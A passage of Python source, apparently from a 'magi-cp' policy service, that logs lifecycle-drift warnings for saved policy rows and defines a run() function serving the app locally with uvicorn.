                "policy_lifecycle_drift policy_id=%r step=%r "
                "trigger_event=%r allowed_events=%r reason=%r "
                "remediation=%s",
                issue["policy_id"], issue["step"],
                issue["trigger_event"], issue["allowed_events"],
                issue["reason"],
                "re-author this policy under one of the allowed "
                "lifecycles or remove the step requirement",
            )
    if drift_count > 0:
        log.warning(
            "magi-cp: %d saved policy row(s) carry D57e lifecycle "
            "drift. PUT/PATCH gates refuse to re-stamp them; "
            "re-author each row under an allowed lifecycle.",
            drift_count,
        )


def run() -> None:  # pragma: no cover
    import uvicorn
    uvicorn.run(_build_production_app(), host="127.0.0.1", port=8787)
